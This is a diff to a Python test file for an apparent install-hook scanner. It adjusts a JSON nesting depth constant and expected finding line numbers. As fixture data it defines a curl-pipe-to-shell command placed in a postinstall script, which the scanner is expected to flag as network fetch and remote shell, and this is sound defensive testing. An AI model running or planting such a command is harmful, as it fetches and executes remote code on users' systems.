@@ -12,7 +12,7 @@ CLEAN = FIXTURES / "clean"
 PREINSTALL_LINE, INSTALL_LINE, POSTINSTALL_LINE = 6, 7, 8
 
 CURL_SH = "curl -s https://example.invalid/x | sh"
-DEPTH = 5000
+DEPTH = 100_000  # 5000 does not overflow json on py3.12
 
 
 def got(findings, severity=None):
@@ -57,8 +57,8 @@ def test_deep_nesting_multiline(tmp_path):
             f'"postinstall": "{CURL_SH}"\n}}\n}}\n')
     findings = got(scan_text(tmp_path, text))
     assert ("H3", "low", "malformed_json", 1) in findings
-    assert ("H3", "high", "network_fetch", 5) in findings
-    assert ("H3", "high", "remote_shell", 5) in findings
+    assert ("H3", "high", "network_fetch", 4) in findings
+    assert ("H3", "high", "remote_shell", 4) in findings
 
 
 def test_deep_nesting_minified(tmp_path):
